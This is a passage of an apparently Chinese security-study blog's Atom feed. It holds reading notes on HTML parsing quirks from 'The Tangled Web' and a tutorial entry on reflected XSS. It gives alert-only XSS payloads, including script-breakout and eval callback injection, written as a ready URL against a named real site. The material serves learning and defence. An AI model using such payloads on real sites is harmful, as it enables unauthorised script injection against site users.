<p>CSS 是能够做到网页表现和内容分离的样式设计语言，有人爱之深切，有人恨之入骨。由于CSS 的存在，让HTML 在语义学上越来越不]]>
    </summary>
    
      <category term="TCP/IP" scheme="http://yoursite.com/tags/TCP-IP/"/>
    
      <category term="Study" scheme="http://yoursite.com/categories/Study/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[HTML的纷争 -- 《The Tangled Web》]]></title>
    <link href="http://yoursite.com/2016/05/04/HTML%E7%9A%84%E7%BA%B7%E4%BA%89-%E3%80%8AThe-Tangled-Web%E3%80%8B/"/>
    <id>http://yoursite.com/2016/05/04/HTML的纷争-《The-Tangled-Web》/</id>
    <published>2016-05-04T03:31:30.000Z</published>
    <updated>2016-05-04T03:32:34.000Z</updated>
    <content type="html"><![CDATA[<h1 id="HTML_的纷争">HTML 的纷争</h1>
<p>HTML 语言的混乱主要源于四种主要解析引擎各自为政，IE 的Trident引擎，Firefox 的Gecko ,Safari 和Chrome 的Webkit,Opera 的Presto. </p>
<h2 id="HTML_文档的基本概念">HTML 文档的基本概念</h2>
<p><strong>语法</strong></p>
<p>HTML 是标签组成的层级结构，文本穿插其中，而主要是使用无个字符进行约束和限制，<strong>左右尖括号，单引号，双引号，&amp;</strong>，所以说，HTML 里会有一些针对这些字符的规则：</p>
<ul>
<li>HTML 文档的绝大部分区域不应该出现单个「&amp;」符号。</li>
<li>HTML 标签内部不应该出现左右尖括号。</li>
<li>文本节点的左尖括号是危险的。</li>
<li>标签中出现引号字符串可能导致意想不到的效果。</li>
</ul>
<p>以上几条规劝，实际上就是在告诫这样书写的代码，随时会被攻击者抓住，利用代码的缺陷，构造XSS 或者是SQL注入。</p>
<p><strong>文档解析模式</strong></p>
<p>对于传统的HTML，解析器会修复大部分语法上的不合规，同时不区分大小写，参数值不一定要用括号括起来，某些标签可以隐式闭合，而对于XML 来说，标签必须严格匹配，区分大小写，可以整合其他兼容格式内容。</p>
<p>值得一提的是，对于HTML ，碰到某些标签后，会落入特殊模式，直到出现特定的终止字符才会退出状态。如style, script, textarea, xmp 直到出现反斜杠匹配，才会退出。</p>
<p>而对于XML，禁止出现单个「&lt;」和「&amp;」，还有一个特殊的语法，只要一”&lt;![CDATA[“字符串开头，以”]])”结束的，中间短路可以封装含有人以标签的任意原始文本数据。</p>
<p><strong>语义之争</strong>：Tim Berners-Lee 的语义网梦想，这里还是比较遥远，不做进一步探讨。</p>
<h2 id="HTML_解析器的行为"><strong>HTML 解析器的行为</strong></h2>
<p>对于XML 来说，不需要担心，因为解析器的错误几乎零容忍。但是，对于HTML 来说，简直就是灾难，为了最大程度的解析，HTML 会以各种让人摸不着头脑的大胆的方式猜测网页作者的用途。以下边这个标签为例：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-04-14623256480455.jpg" alt=""></p>
<p>先不考虑它没有闭合仍然正常被解析这件事，看各家解析器做出的各种支持：</p>
<ul>
<li>IE 浏览器允许吧空字节NUL（0x00） 插入到1位置</li>
<li>2，4的空白位置可以使用垂直制表符(0x0b)或者进纸换页符(0x0c)替换，令人惊奇的是FireFox 允许在2 用单个普通的正斜杠代替。</li>
<li>3，曾经WebKit 甚至允许此处有正斜杠使用。</li>
<li>位置5，在IE还能接受反引号。</li>
<li>被引号括起来的参数，后边实际上隐式的跟着一个空格符，所以位置6空格可以去掉。</li>
</ul>
<p>一个常见的攻击手段就是xss，此处借助title,我们将 hello world 替换成 hello world” onerror=”alert(1) 于是，对于原标签就变成了：</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img src=image.jpg tile=<span class="string">"hello world"</span>onerror=<span class="string">"alert(1)"</span> <span class="keyword">class</span>=example&gt;</div></pre></td></tr></table></figure>

<p>很自然的一个脚本被我们植入进去了，一个xss 就被触发了。</p>
<p><strong>多重标签的交互</strong></p>
<p>在不正常的HTML 里，还会出现多个HTML 标签堆叠在一起，看起来就让人头疼，而浏览器在解析的时候，也会有区别，比如:</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;i &lt;b&gt;</div></pre></td></tr></table></figure>

<p>大多数浏览器会先解析成<strong>‘&lt; i &gt;’</strong> ，而把&lt; b 视为无效的标签参数。</p>
<p>另外，整个文档结束时候标签未闭合的情况也让人摸不清头脑。比如：</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;i foo=<span class="string">"&lt;b&gt;"</span> [EOF]</div></pre></td></tr></table></figure>

<p>大多数浏览器解析为i 的标签，或者是整个忽略掉，但对于IE 和 Opera 却从后往前处理，把这一串理解成 b 的标签。</p>
<p>所以假如攻击者，可以阶段加载的页面，就可以通过构造手段，让浏览器解析成完全不同的内容。</p>
<h2 id="HTML_实体编码">HTML 实体编码</h2>
<p>（由于MarkDown语言里，自动把这些编码识别出来了，包括尖括号，只好中间加空格或这种方式来书写。）</p>
<p>hTML 的实体编码格式是以&amp;开头，以分号结尾，在HTML 规范里，散步着无数这样的命名实体，比如&amp; lt; 插入左尖括号，&amp; gt;用于插入右尖括号，&amp; amp; 替换 &amp;符号自身。&amp; rarr; 代表一个Unicode箭头等等。</p>
<p>除了命名实体，还可以插入任意十进制ASCII 或者 Unicode 字符编码，样式是 &amp;#数字；<br>例如 &amp;# 60; 被识别成左尖括号，&amp;# 62; 别识别为右尖括号。而十六进制的标记符在这在编码前边加一个x,所以 &amp;# x3c; 仍然是一个左尖括号。</p>
<p>对于HTML 来说，解析器能识别在文本节点和参数值里边的实体编码，在创建文档树的时候，透明的对这些编码进行解码。</p>
<p>但是有一点疑惑的是，在识别和解析HTML 实体任务重，有一些奇怪的解析，比如传统解析中，只要实体名称后边跟着的字符不是字母数字，即使是少了分号，实体名还是被接受了。对于数字型的实体，后边可以跟任意多个0，导致一个超长的数字串，会造成出错。</p>
<h2 id="HTTP/HTML_交互语义">HTTP/HTML 交互语义</h2>
<p>一般来说，我们会在HTTP 的头域指定内容的一些信息，比如Content-Type, Content-Disposition, Transfer-Encoding等等，然而考虑如果我们不适用HTTP 传输HTML，甚至是直接从本地加载HTML，就不能依靠HTTP 的头域来确定编码等信息了。如果缺了像 MIME type 或者字符集这样关键参数，就会破事浏览器随意处置文档的编码解析问题。</p>
<p>解决办法就是文档开头声明&lt; meta http-equiv=…&gt; 指令进行编码设定，一个典型的指定是这样的：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">meta</span> <span class="attribute">http-equiv</span>=<span class="value">"Content-Type"</span> <span class="attribute">content</span>=<span class="value">"text/html;charset=utf-8"</span>&gt;</span></div></pre></td></tr></table></figure>



<p>如果多个http-equiv冲突，或者从服务器端返回HTTP 头域有冲突的话，浏览器表现就会很不一致，一般优先支持hTTP 响应头，然后支持第一个出现的charset。</p>
<h2 id="超链接与内容包含">超链接与内容包含</h2>
<p>这一块是XSS 的重灾区。</p>
<p>一个单纯的HTML 链接写法是这样的：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">a</span> <span class="attribute">href</span>=<span class="value">"http://www.example.com/"</span>&gt;</span>click me!<span class="tag">&lt;/<span class="title">a</span>&gt;</span></div></pre></td></tr></table></figure>

<p>对于这个超链接，它支持指向浏览器支持的所有协议，包括伪URL，如data: javascript:。</p>
<p>同时，该语法可选的target参数有四种，<strong>_blank</strong>总是打开新窗口；<strong>_parent</strong> 转到包含发出当前链接文档的上一级视图；<strong>_top</strong> 转到浏览器最顶级窗口。<strong>_self</strong> 和没有设置这个值一样。</p>
<p><strong>表单和表单触发的请求</strong></p>
<p>XSS 重灾区。</p>
<p>一个典型的表单写法如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">form</span> <span class="attribute">method</span>=<span class="value">GET</span> <span class="attribute">action</span>=<span class="value">"/process_form.cgi"</span>&gt;</span></div><div class="line">名字：<span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">text</span> <span class="attribute">name</span>=<span class="value">given</span>&gt;</span></div><div class="line">姓氏：<span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">text</span> <span class="attribute">name</span>=<span class="value">family</span>&gt;</span></div><div class="line">...</div><div class="line"><span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">submit</span> <span class="attribute">value</span>=<span class="value">"完成后提交"</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="title">form</span>&gt;</span></div></pre></td></tr></table></figure>

<p>值得注意的是，form 彼此不能嵌套，如果嵌套了，只有最外层的有效。</p>
<p>如果method 为GET，那么包含的字段名称和他们的值，会以百分号编码机制转义，但其中空格(0x20) 会被以加号代替而非%20,而所有的加号被编码成%2b 。经过编码的「名称=值」数据对用&amp; 连接付分割，组成完整的字符串。</p>
<p>如果method 是POST，分几种情况：</p>
<ul>
<li>默认情况下，application/x-www-form-urlencoded 编码方式，信息组成方式与GET 方式相同，不同的是数据会放在请求头的数据体部分提交，目标URL 查询字符串和其他部分保持不变。<strong>潜在的问题，如果查询字符串和POST 数据体参数相同，冲突，可能会造成HTTP 参数污染</strong></li>
<li>额外的把form 标签中的编码设置为enctype = “text/plain”。而采用这种做法，字段的名称和值不会以百分号编码方式进行编码，某些浏览器可能会把空格替换成加号，而原来用于分割的&amp; 以换行符替换。因此，这样格式的数据，无法明确的对赎金进行解析，因为无法完全区分换行符和等号是表单带进来的，还是浏览器加入的。</li>
<li>entype = “multipart/form-data”，通过表单提交用户选择的文件时候，要用这种模式，会产生一系列较短的MIME 消息，对应于提交的每个字段。然后每个字段会有一个由哭护短选择的特定符号分割。</li>
</ul>
<p><strong>Frame 框架</strong></p>
<p>其作用是使HTML 文档内嵌和显示另一个页面中，有独立的文档视图，甚至独立的JS 环境。对于src 值的限定，与其他链接的规则基本相同， 所以 iframe 也是一个安全隐含。</p>
<p><strong>其他特定的内容</strong></p>
<p>包括图片，层级样式表，客户端脚本，插件内容等等，这些不再赘述，他们都有XSS 的风险。</p>
<h2 id="安全工程">安全工程</h2>
<ul>
<li>良好的规范，良好的规范，良好的规范，毫无疑问要确保输出统一的、有效的、浏览器支持的Content-type 响应头和 charset 字符集信息，以免文档不能按照原有意思解析。</li>
<li>文档包括可被控制的信息时，应当充分考虑到漏洞的可能。<ul>
<li>针对文本部分里用户提供内容：应当以实体编码方式处理左右尖括号和&amp; ， 以及其他的各种ASCII等编码问题。同时，某些Unicode 元字符 U+202E 可能会改变之后文本的显示方向和顺序，<strong>是不是想起了微信</strong>。</li>
<li>针对style 和 on* 标签参数，要做多重编码转义处理，但这种处理往往又有可能出错，所以处处小心。</li>
<li>其他的HTML 参数值，对攻击者能够控制的输入，总是用引号来括起来，对左右尖括号和&amp; 以及任何<strong>单独出现的引号</strong>都要进行实体编码。同时，不要对URL 或其他参数有问题的值做黑名单验证，反而会造成脚本执行漏洞。</li>
<li>特殊的解析模式下，如script, style 区块里的内容，仍然是仔细处理引号字符串，左右尖括号，所有非打印字符都应做好合适的转义处理。</li>
</ul>
</li>
</ul>
<hr>
<p>HTML 部分写完，但是要想完全搞清楚HTML 编码部分的问题，简直是一件不可能完成的任务，曾经有本书叫《Web Application Obfuscation》，它企图创建出能拦截所有已知的危险模式的过滤器，同时又不会影响到其他段落的正常功能，而实际上，这是不可能完成的任务。</p>
<p>一个良好的方法是用一个解析器，把输入的文档翻译成放在内存里的层级文档树，然后去除掉那些无法识别的参数和标签，和所有不需要的标签、参数、参数值。然后在对文档树进行良好的排序和转义，这样看起来要方便和清晰许多。</p>
<p>另外，HTML 中存在问题，造成最大的影响就是XSS 和CSRF 这两个攻击手段，攻击者会绞尽脑汁的绕过开发者设置的层层障碍，他们的最终目的无论如何，都是试图通过各种混淆的代码，让解析器理解成其他意思，达成攻击效果。而XSS 的三种攻击模式，反射型，储存型，DOM 型，都是在这些修修补补的篱笆上找一个足以穿越过去的漏洞。</p>
<p>在配合上HTTP 的问题，可以创造一切可能，对于XSS 的世界，脑洞有多大，可能有多大。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="HTML_的纷争">HTML 的纷争</h1>
<p>HTML 语言的混乱主要源于四种主要解析引擎各自为政，IE 的Trident引擎，Firefox 的Gecko ,Safari 和Chrome 的Webkit,Opera 的Presto. </p>
<h2 i]]>
    </summary>
    
      <category term="TCP/IP" scheme="http://yoursite.com/tags/TCP-IP/"/>
    
      <category term="Study" scheme="http://yoursite.com/categories/Study/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[(level 2)把XSS放进脚本 -- XSS升级之路]]></title>
    <link href="http://yoursite.com/2016/05/03/-level-2-%E6%8A%8AXSS%E6%94%BE%E8%BF%9B%E8%84%9A%E6%9C%AC-XSS%E5%8D%87%E7%BA%A7%E4%B9%8B%E8%B7%AF/"/>
    <id>http://yoursite.com/2016/05/03/-level-2-把XSS放进脚本-XSS升级之路/</id>
    <published>2016-05-03T13:29:18.000Z</published>
    <updated>2016-05-03T13:29:50.000Z</updated>
    <content type="html"><![CDATA[<h1 id="level_2_包装进script">level 2 包装进script</h1>
<p>上一等级里，我们的xss 构造格式是在img 中,然后直接通过URL 参数提交，通常反射型的XSS 比较广泛，但是伤害一般来说没有太高，而且比较容易防范。除了img 元素，还有诸如input, iframe，a href, 主要利用的是href 或者 src 可以使用javascript, 或者是使用onerror，表示当前图片无法显示时候可以调用的脚本。更多的内容，接下来详析。</p>
<p>接下来，我们针对的还是反射型的XSS，仍然是在参数中，作为目标文件中的参数，通过URL 传递给它，但是没有对该参数进行详细的过滤，造成了有机可趁，继续放出腾讯家以前的一个例子，也是乌云上的，网址如下：</p>
<p><a href="http://activity.soso.com/common/setParentsInfo.php?callback=aaaaaaaaa" target="_blank" rel="external">http://activity.soso.com/common/setParentsInfo.php?callback=aaaaaaaaa</a></p>
<p>此处的callback 参数，如果没有过滤的话，得到的网页源码里，我们就会看出来，如下：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-03-14622798034256.jpg" alt=""></p>
<p>拿出这一块的上下文代码，大约构造是这样的：</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script type=<span class="string">'text/javascript'</span>&gt;<span class="built_in">document</span>.domain=<span class="string">'soso.com'</span>;_ret={<span class="string">"_res"</span>:<span class="number">2</span>};<span class="keyword">try</span>{parent.aaaaaa(_ret);}<span class="keyword">catch</span>(err){aaaaaa(_ret);}&lt;<span class="regexp">/script&gt;</span></div></pre></td></tr></table></figure>

<p>aaaaaa如果我们替换成</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(<span class="regexp">/xss/</span>)&lt;<span class="regexp">/script&gt;</span></div></pre></td></tr></table></figure>

<p>当然，我们注意到，上边的script 还没有闭合，为了让代码提前跳出前一个script ，我们应该在前边吧sciprt 闭合，这样：</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;<span class="regexp">/script&gt;&lt;script&gt;alert(/</span>xss/)&lt;<span class="regexp">/script&gt;</span></div></pre></td></tr></table></figure>

<p>这样，很明显，就会继续发起了XSS 弹窗。但是，如果我们不允许输入破折号呢，上边所说的就没有办法了，但是，这并不代表毫无办法，还有一些具有威胁的函数，比如eval, String.fromCharCode, execute，这些都会造成XSS，也要过滤。如下，我们使用eval() 来构造攻击：</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http:<span class="comment">//activity.soso.com/common/setParentsInfo.php?callback=eval('alert(1)');void</span></div></pre></td></tr></table></figure>

<p>callback=eval(‘alert(1)’);void 仍然令我们的源代码语法正确，能够正确执行。<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-03-14622803866844.jpg" alt=""></p>
<p>但是像这样构造出来的情况，其实非常的少见，因为正常传第一个参数进去，开发者都会将 “ 过滤掉，这样构造就失败了。 </p>
<p>我们知道，XSSer 和 防御者之间的斗争从来就是道高一尺，魔高一丈的过程，防御者绞尽脑汁去过滤所有可能出现的情况，去处理所有可能的奇葩诡异编码情况，而XSSer 又会绞尽脑汁的去挖掘茫茫网络中漏洞，努力用各种奇技淫巧构造出五花八门的形态，看起来诡异无比，然而偏偏又能让javascript 语法正确，正常运行。</p>
<p>然而xss 却又一直是热门，但并不是很受重视的攻击手法，原因大概是这样的：</p>
<ol>
<li>挖洞太麻烦，很耗时间，看上边两个漏洞，其中一个甚至是在某个获取QQ 应用宝上某个app 数据的URL 里发现的，而这种页面甚至很难被发现，所以他的伤害比较低，找到它却又要花费大量时间，而且还有很多构造方法不能成功，需要尝试各种模式。</li>
<li>这种伤害不是很大的反射型攻击，尚且还有机会通过爬虫自动化的挖掘到漏洞存在的可能，有很多复杂的存储型和DOM 型漏洞，更难通过爬虫挖到。</li>
<li>需要有良好的HTML，JS 功底，但是呢，如果功底好的话，直接就跑去做前端了，前端业务现在那么缺高级工程师。更多的，还需要有PHP，JSP 功底。</li>
<li>而Website 设置http-only,crossdomain.xml 时候，很多模式化的xss就失去力量了。</li>
<li>然而为什么热门呢，因为HTTP 世界的混乱，之前在写Web之困读书笔记的时候，作者也是强力吐槽了这个混乱的HTTP 世界，所以造成了XSS 几乎无处不在，而如果一个利用好的XSS，或者CSRF漏洞，会在某些情况下，造成难以弥补的伤害。</li>
<li>本质上将，SQL注入和XSS 都是由于代码上相似的漏洞造成的，而SQL 注入的危害要比XSS 看起来危险很多，很多人在挖SQL 注入漏洞的时候，顺手就挖几个XSS，也是很正常的。</li>
<li>XSS 虽然看起来比较温柔，但是配上社工手段，可造成的影响仍然是不可小觑的，所以XSS 会火下去。</li>
</ol>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="level_2_包装进script">level 2 包装进script</h1>
<p>上一等级里，我们的xss 构造格式是在img 中,然后直接通过URL 参数提交，通常反射型的XSS 比较广泛，但是伤害一般来说没有太高，而且比较容易防范。除了img 元素，还]]>
    </summary>
    
      <category term="security" scheme="http://yoursite.com/tags/security/"/>
    
      <category term="Study" scheme="http://yoursite.com/categories/Study/"/>
    
  </entry>
  
</feed>
